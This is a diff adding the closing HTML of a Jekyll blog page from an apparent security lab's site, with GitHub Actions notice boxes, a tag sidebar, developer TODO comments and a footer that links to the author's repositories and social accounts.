+                            <svg fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 16 16" role="img" aria-labelledby="title-9637423397128071" xmlns="http://www.w3.org/2000/svg"><title id="title-9637423397128071">External link icon</title><path d="M6.75,1.75h-5v12.5h12.5v-5m0,-4v-3.5h-3.5M8,8l5.5-5.5"></path></svg>
+                            </span>
+                        </a>
+                    </p>
+                </div>
+            </form>
+        </div>
+    </diva-Feed-xml>
+    
+
+    
+    
+    
+    
+    
+    <diva-Github-Action>
+        <div class="js-notice">
+            <form class="Box-aricle position-relative rounded-2 mb-4 p-3 js-notice-dismiss overflow-hidden" style="z-index: 1" data-turbo="false">
+                <picture>
+                    <img src="https://image.yjs2635.xyz/images/2022/06/27/bg.jpg" alt="" class="position-absolute top-0 left-0 width-full select-forbidden" style="pointer-events: none; z-index: -1; height: 100%; height: 100%; object-fit: cover;">
+                </picture>
+                <!--TODONE:
+                 !--- Done. issue 1. While click to close the <X button/div>, whole h5 page will refresh. I don't know why.
+                    -- use <span> labels instead of <button> :-D
+                 !--- Done. issue 2. By <Js function> custom_close change/add div's class to hide buttons/divs, so while have 2 or more, all will close
+                    -- see `/assets/js/oh-sentry.js`
+                 ~~;*(~~ :-D
+                -->
+                <div class="position-absolute p-2" style="top: 4px; right: 6px;">
+                    <span id="hidden-2-click-Github-Action" aria-label="Close" type="submit" data-view-component="true" class="close-button color-fg-on-emphasis pointer">
+                    <svg aria-hidden="true"  data-view-component="true" class="octicon octicon-x" height="16" viewBox="0 0 16 16" version="1.1" width="16">
+                    <path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path>
+                    </svg></span>
+                </div>
+
+                <img src="/assets/img/svg/actions-icon-actions.svg" alt="Github-Action" width="32" height="32" class="d-block select-forbidden">
+                <p class="my-3 col-7 color-fg-on-emphasis text-bold h4">
+                    Automate your workflow from idea to production
+                </p>
+
+                <div class="content">
+                    <p>
+                        <a href="https://docs.github.com/cn/actions" class="btn-primary btn btn-block" target="blank">
+                            More about Github Action
+                            <span class="DocsMarkdown--link-external-icon">
+                            <svg fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 16 16" role="img" aria-labelledby="title-9637423397128071" xmlns="http://www.w3.org/2000/svg"><title id="title-9637423397128071">External link icon</title><path d="M6.75,1.75h-5v12.5h12.5v-5m0,-4v-3.5h-3.5M8,8l5.5-5.5"></path></svg>
+                            </span>
+                        </a>
+                    </p>
+                </div>
+            </form>
+        </div>
+    </diva-Github-Action>
+    
+    <!--notice end-->
+    <div class="spacing"></div>
+    <h4> Search/搜索 <kbd>Ctrl ⌃</kbd> + <kbd>F</kbd></h4>
+    <p>e.g. Nginx：</p>
+    <p><a href="/blog/2019/how-nginx/http2https/">NGINX笔记：http升级https协议</a> </p>
+    <p><a href="/blog/2019/nginx/with/jekyll-site/">多子域：JEKYLL优雅地部署于NGINX</a> </p>
+
+        <div class="hidden-print">
+            <h4><ion-icon name="grid-sharp"></ion-icon> 分类目录</h4>
+            <div class="hline"></div>
+            <div class="spacing"></div>
+            
+            <div class="post-meta mb-3">
+                <details open>
+                    <summary class="point flex justify-between">本文分类</summary>
+                    
+                    <p>
+                        <i class="far fa-folder fa-fw mr-1"></i> <a href='/blog/'>blog</a></p>
+                    
+                </details>
+            </div>
+            
+            <p>
+            <details open>
+                <summary class="point flex justify-between">所有标签/数量</summary>
+                
+                <p>
+                    <i class="fa fa-angle-right"></i> BLOG
+                    <span class="badge badge-theme pull-right">53</span>
+                </p>
+                
+                <p>
+                    <i class="fa fa-angle-right"></i> TOP
+                    <span class="badge badge-theme pull-right">5</span>
+                </p>
+                
+                <p>
+                    <i class="fa fa-angle-right"></i> ABOUT
+                    <span class="badge badge-theme pull-right">34</span>
+                </p>
+                
+                <p>
+                    <i class="fa fa-angle-right"></i> DAILY
+                    <span class="badge badge-theme pull-right">3</span>
+                </p>
+                
+                <p>
+                    <i class="fa fa-angle-right"></i> 笔记
+                    <span class="badge badge-theme pull-right">4</span>
+                </p>
+                
+                <p>
+                    <i class="fa fa-angle-right"></i> GITHUB ACTION
+                    <span class="badge badge-theme pull-right">4</span>
+                </p>
+                
+            </details>
+        </div><!--class="hidden-print" stop-->
+</div>
+
+</div>
+    </div><!--/row -->
+</div><!--/container -->
+
+
+        <!-- 代码引用申明/code reference declaration:
+#############################################################################
+## code from cloudflare. visit footer in https://www.cloudflare.com/zh-cn/ ##
+#############################################################################
+-->
+
+<link rel="stylesheet" type="text/css" href="/assets/css/footer.css">
+<script src="/assets/js/sentryabout.js"></script>
+<div id="footerwrap" class="hidden-print">
+    <div class="footer-container">
+        <div class="pt3 pt3-ns pt3-m pt7-l pb0 pb0-ns pb0-m pb5-l">
+            <div class="footer-row">
+                
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l">
+            <a><strong><center>入门</center></strong></a>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6"><a class="white f2 fw4" href="/usage/" target="blank">快速开始</a></li>
+            
+            <li class="mt1 lh-6"><a class="white f2 fw4" href="/blog/2019/jekyll/in/linux/" target="blank">博客搭建</a></li>
+            
+            <li class="mt1 lh-6"><a class="white f2 fw4" href="/blog/2019/nginx/with/jekyll-site/" target="blank">公网部署</a></li>
+            
+            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://github.com/tuna/mirror-web/" target="blank"><em>Jekyll Tuna</em>源码</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l">
+            <a><strong><center>社区</center></strong></a>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://github.com/Bin4xin/bigger-than-bigger/" target="blank"><em>Bigger than Bigger</em></a></li>
+            
+            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV" target="blank"><em>Collection Of Verified Vulnerabilities</em></a></li>
+            
+            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://github.com/Bin4xin/sweet-ysoserial" target="blank"><em>sweet-ysoserial</em></a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l">
+            <a><strong><center>技术栈</center></strong></a>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://jekyllrb.com/docs/" target="blank"><em>Jekyll</em></a></li>
+            
+            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://www.markdownguide.org/" target="blank"><em>MarkDown</em></a></li>
+            
+            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://www.cloudflare.com/waf/" target="blank"><em>CloudFlare WAF</em></a></li>
+            
+            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://dash.cloudflare.com/dns/" target="blank"><em>CloudFlare CDN</em></a></li>
+            
+            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://github.com/features/actions" target="blank"><em>Github Action</em></a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l">
+            <a><strong><center>关于</center></strong></a>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6"><a class="white f2 fw4" href="/about/" target="blank">近期研究</a></li>
+            
+            <li class="mt1 lh-6"><a class="white f2 fw4" href="/blog/" target="blank">博客</a></li>
+            
+            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://github.com/Bin4xin/bin4xin.github.io/wiki" target="blank"><em>WIKI</em></a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l">
+            <a><strong><center>贡献者</center></strong></a>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://github.com/bin4xin" target="blank">本阿信</a></li>
+            
+            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://github.com/dnf-2008" target="blank">夏天の风</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+                <div class="footer-col-lg-2">
+                    <div class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l">
+                        <a class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l"><strong><center>其他</center></strong></a>
+                        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+                            <li class="mt1 lh-6"><a class="white f2 fw4"><em> ∑ <csmall>(Visitors/times)</csmall></em></a></li>
+                            <li class="mt1 lh-6">
+                                <a class="white f2 fw4"><img src="https://profile-counter.glitch.me/bin4xin.github.io/count.svg" style="max-width:100%;"></a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div><!-- "/row"-->
+
+
+            <div class="pv5">
+                <div class="flex flex-wrap justify-start justify-start-ns justify-start-m justify-between-l footer-bottom-row-margin">
+                    <div class="mb3 mb3-ns mb3-m mb0-l lh-1 mt0 mt3-ns">
+                        <a class="lh-1 dib mr2" title="Facebook" target="_blank" rel="noopener" href="https://www.facebook.com/#">
+                            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M16 32C24.8366 32 32 24.8366 32 16C32 7.16344 24.8366 0 16 0C7.16344 0 0 7.16344 0 16C0 24.8366 7.16344 32 16 32Z" fill="white"></path>
+                                <path d="M10.2965 16.7999H12.9405V27.6799C12.9405 27.786 12.9826 27.8877 13.0576 27.9628C13.1327 28.0378 13.2344 28.0799 13.3405 28.0799H17.8205C17.9266 28.0799 18.0283 28.0378 18.1033 27.9628C18.1783 27.8877 18.2205 27.786 18.2205 27.6799V16.8359H21.2605C21.3575 16.8369 21.4516 16.8025 21.5252 16.7392C21.5988 16.6759 21.6469 16.588 21.6605 16.4919L22.1205 12.4919C22.1255 12.4364 22.1189 12.3805 22.101 12.3278C22.0832 12.275 22.0545 12.2265 22.0169 12.1855C21.9792 12.1445 21.9334 12.1117 21.8824 12.0894C21.8313 12.0671 21.7762 12.0557 21.7205 12.0559H18.2005V9.53992C18.2005 8.78392 18.6005 8.39992 19.4005 8.39992H21.6925C21.7986 8.39992 21.9003 8.35778 21.9753 8.28276C22.0503 8.20775 22.0925 8.10601 22.0925 7.99992V4.31992C22.0925 4.21384 22.0503 4.11209 21.9753 4.03708C21.9003 3.96206 21.7986 3.91992 21.6925 3.91992H18.4005C16.9464 3.92501 15.5431 4.45481 14.4485 5.41192C13.9315 5.8638 13.5348 6.43694 13.294 7.07992C13.0531 7.7229 12.9756 8.41561 13.0685 9.09592V12.0319H10.2965C10.1904 12.0319 10.0887 12.0741 10.0136 12.1491C9.93863 12.2241 9.89648 12.3258 9.89648 12.4319V16.3999C9.89648 16.506 9.93863 16.6077 10.0136 16.6828C10.0887 16.7578 10.1904 16.7999 10.2965 16.7999Z" fill="#222222"></path>
+                            </svg>
+                        </a>
+                        <a class="lh-1 dib mr2" title="Twitter" target="_blank" rel="noopener" href="https://twitter.com/bin4xin">
+                            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M16 32C24.8366 32 32 24.8366 32 16C32 7.16344 24.8366 0 16 0C7.16344 0 0 7.16344 0 16C0 24.8366 7.16344 32 16 32Z" fill="white"></path>
+                                <path d="M23.917 10.7759C23.6572 10.8922 23.3899 10.9911 23.117 11.0719C23.4414 10.7016 23.6865 10.2687 23.837 9.79988C23.8553 9.74704 23.8566 9.68979 23.8407 9.63616C23.8249 9.58253 23.7927 9.53519 23.7486 9.5008C23.7045 9.4664 23.6507 9.44666 23.5948 9.44435C23.539 9.44203 23.4838 9.45725 23.437 9.48788C22.867 9.82828 22.2476 10.0779 21.601 10.2279C21.0705 9.71367 20.3936 9.37678 19.6635 9.26372C18.9335 9.15065 18.1863 9.26699 17.5252 9.59667C16.8641 9.92635 16.3216 10.4531 15.9726 11.1043C15.6236 11.7554 15.4854 12.4988 15.577 13.2319C14.3655 13.1234 13.188 12.7738 12.1137 12.2037C11.0393 11.6335 10.0898 10.8543 9.32096 9.91188C9.29299 9.87906 9.25762 9.85336 9.21777 9.83689C9.17792 9.82043 9.13472 9.81368 9.09174 9.81719C9.04876 9.82071 9.00724 9.8344 8.97059 9.85712C8.93394 9.87984 8.90322 9.91095 8.88096 9.94788C8.56783 10.4919 8.40236 11.1082 8.40096 11.7359C8.39878 12.5818 8.69961 13.4006 9.24896 14.0439C9.0844 13.9873 8.92512 13.9163 8.77296 13.8319C8.73235 13.8102 8.68701 13.7988 8.64096 13.7988C8.59491 13.7988 8.54957 13.8102 8.50896 13.8319C8.46844 13.8548 8.43459 13.8879 8.41075 13.9279C8.3869 13.9678 8.37388 14.0133 8.37296 14.0599V14.1079C8.37409 14.7252 8.53538 15.3317 8.84107 15.8681C9.14676 16.4044 9.58638 16.8523 10.117 17.1679C10.0255 17.1604 9.93467 17.1471 9.84496 17.1279C9.79894 17.12 9.75169 17.124 9.70761 17.1394C9.66354 17.1548 9.62409 17.1811 9.59296 17.2159C9.56317 17.2506 9.54276 17.2923 9.53366 17.3371C9.52456 17.3819 9.52707 17.4283 9.54096 17.4719C9.72712 18.0654 10.0661 18.5996 10.5238 19.0209C10.9816 19.4421 11.542 19.7356 12.149 19.8719C11.1397 20.504 9.97183 20.8368 8.78096 20.8319C8.52009 20.8284 8.25965 20.8097 8.00096 20.7759C7.94069 20.7687 7.87975 20.7822 7.82814 20.8141C7.77652 20.846 7.73728 20.8946 7.71683 20.9517C7.69639 21.0089 7.69595 21.0713 7.71559 21.1287C7.73524 21.1862 7.7738 21.2352 7.82496 21.2679C9.37642 22.2633 11.1816 22.791 13.025 22.7879C14.3751 22.8191 15.7157 22.5538 16.9521 22.0106C18.1885 21.4673 19.2907 20.6594 20.181 19.6439C21.7606 17.848 22.6409 15.5435 22.661 13.1519C22.661 13.0559 22.661 12.9559 22.661 12.8599C23.2844 12.3901 23.8252 11.8196 24.261 11.1719C24.2928 11.1232 24.3081 11.0656 24.3048 11.0076C24.3015 10.9496 24.2797 10.8941 24.2426 10.8494C24.2054 10.8046 24.1549 10.773 24.0985 10.759C24.0421 10.7451 23.9826 10.7496 23.929 10.7719L23.917 10.7759Z" fill="#222222"></path>
+                            </svg>
+                        </a>
+                        <a class="lh-1 dib mr2" title="LinkedIn" target="_blank" rel="noopener" href="https://www.linkedin.com/#">
+                            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M16 32C24.8366 32 32 24.8366 32 16C32 7.16344 24.8366 0 16 0C7.16344 0 0 7.16344 0 16C0 24.8366 7.16344 32 16 32Z" fill="white"></path>
+                                <path d="M17.0123 14.7596V14.7236L16.9883 14.7596H17.0123Z" fill="#222222"></path><path d="M11.3962 24.0561H7.79621V13.2001H11.3962V24.0561ZM9.60021 11.7001H9.57621C9.31915 11.7177 9.06122 11.6821 8.81857 11.5954C8.57591 11.5088 8.35376 11.3729 8.16602 11.1965C7.97828 11.02 7.82899 10.8067 7.7275 10.5698C7.62601 10.333 7.57451 10.0778 7.57621 9.82009C7.57621 8.75209 8.37621 7.94009 9.62021 7.94009C9.87894 7.92022 10.139 7.95412 10.384 8.03965C10.6289 8.12519 10.8536 8.26052 11.0437 8.43711C11.2338 8.61371 11.3853 8.82775 11.4887 9.06576C11.592 9.30378 11.645 9.56061 11.6442 9.82009C11.6362 10.8641 10.8522 11.7001 9.60021 11.7001ZM24.4322 24.0561H20.8002V18.2401C20.8002 16.7801 20.2802 15.7801 18.9722 15.7801C18.564 15.782 18.1664 15.9103 17.834 16.1474C17.5017 16.3845 17.2509 16.7187 17.1162 17.1041C17.0231 17.3877 16.9824 17.6859 16.9962 17.9841V24.0601H13.3962C13.3962 24.0601 13.4442 14.2041 13.3962 13.1841H16.9962V14.7241C17.3244 14.1561 17.8016 13.6886 18.3761 13.3721C18.9506 13.0556 19.6008 12.902 20.2562 12.9281C22.6322 12.9281 24.4162 14.4841 24.4162 17.8241L24.4322 24.0561Z" fill="#222222"></path>
+                            </svg>
+                        </a>
+                        <a class="lh-1 dib mr2" title="Youtube" target="_blank" rel="noopener" href="https://www.youtube.com/channel/UClJ81qWUWtySnemTo7njueA">
+                            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M16 32C24.8366 32 32 24.8366 32 16C32 7.16344 24.8366 0 16 0C7.16344 0 0 7.16344 0 16C0 24.8366 7.16344 32 16 32Z" fill="white"></path><path d="M24.0555 19.9478C23.964 20.3766 23.741 20.7662 23.4176 21.0623C23.0943 21.3584 22.6867 21.5463 22.2515 21.5998C20.1732 21.7893 18.086 21.8627 15.9995 21.8198C13.9131 21.8628 11.8258 21.7893 9.74752 21.5998C9.31377 21.5476 8.90704 21.3617 8.58377 21.0678C8.2605 20.7739 8.03674 20.3867 7.94352 19.9598C7.69907 18.6548 7.60113 17.3266 7.65152 15.9998C7.60334 14.6769 7.70262 13.3528 7.94752 12.0518C8.04104 11.6259 8.26439 11.2394 8.58677 10.9457C8.90915 10.6519 9.3147 10.4654 9.74752 10.4118C11.8256 10.2186 13.9128 10.1411 15.9995 10.1798C18.0873 10.1369 20.1759 10.2104 22.2555 10.3998C22.6889 10.4532 23.095 10.6396 23.4181 10.9333C23.7411 11.2269 23.9652 11.6135 24.0595 12.0398C24.3026 13.345 24.3992 14.6732 24.3475 15.9998C24.397 17.3226 24.2991 18.6468 24.0555 19.9478Z" fill="#222222"></path><path d="M13.8438 18.5923L19.1517 15.8403C17.3717 14.9123 15.5997 14.0003 13.8438 13.0723V18.5923Z" fill="white"></path>
+                            </svg>
+                        </a>
+                    </div>
+
+                    <div class="flex flex-wrap items-center fw5 lh-copy f1 mt0 mt3-ns footer-bottom-row-text-links-margin">
+                        <span class="pr1 inline-flex white f2 fw4">© 2019-2022 SentrySec, Lab. Build by Jekyll under the terms of the MIT License.</span>
+                        <!-- <a class="bl inline-flex white lh-solid fw5 ph1" href="/privacypolicy/">隐私政策</a>
+                        <a class="bl inline-flex white lh-solid fw5 ph1" href="/website-terms/">使用条款</a>
+                        <a class="bl inline-flex white lh-solid fw5 ph1" href="/disclosure/">披露</a>
+                        <a class="bl inline-flex white lh-solid fw5 ph1" href="/abuse/">信任与安全</a>
+                        <button class="bl inline-flex white lh-solid fw5 ph1 bg-transparent outline-transparent pointer">Cookie 首选项</button>
+                        <a class="bl inline-flex white lh-solid fw5 ph1" href="/trademark/">商标</a> -->
+                    </div>
+                </div>
+            </div><!-- "/pv5" -->
+        </div>
+    </div>
+</div><!--/footerwrap -->
+
+    </body>
+
+    <script src="/assets/js/copy.js"></script>
+<style>
+
+</style>
+
+<!--TODONE.
+**FireFox display BUG**
+position-fixed in FireFox display position -> none
+- Reference:
+    - { @link https://developer.mozilla.org/zh-CN/docs/Web/CSS/position#browser_compatibility }
+    - { @link https://blog.csdn.net/DDD4V/article/details/123354124 }
+    - { @link https://juejin.cn/post/6844904100576886797 }
+        - { @link Demo https://codepen.io/li377242494/pen/VwLGGaR }
+Fiex In `[assets/css/style.scss](https://github.com/Bin4xin/bin4xin.github.io/blob/main/assets/css/style.scss)`
+    - tooltipped css postion.
+-->
+<divs role="tooltip" class="position-fixed bottom-0 mb-4 right-0 mr-4 z-1 transition-200 opacity-0" onclick="$(&quot;html,body&quot;).animate({scrollTop:0}, 1000);">
+    <button class="tooltipped tooltipped-n tooltipped-no-delay color-bg-accent-emphasis color-fg-on-emphasis circle border-0" style="width:45px;height:45px"
+            aria-label="滚动到顶部">
+        <svg aria-hidden="true" role="img" class="octicon octicon-chevron-up" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" style="display:inline-block;user-select:none;vertical-align:text-bottom;overflow:visible">
+            <path fill-rule="evenodd" d="M3.22 9.78a.75.75 0 010-1.06l4.25-4.25a.75.75 0 011.06 0l4.25 4.25a.75.75 0 01-1.06 1.06L8 6.06 4.28 9.78a.75.75 0 01-1.06 0z">
+            </path>
+        </svg>
+    </button>
+</divs>
+
+
+</html>
+
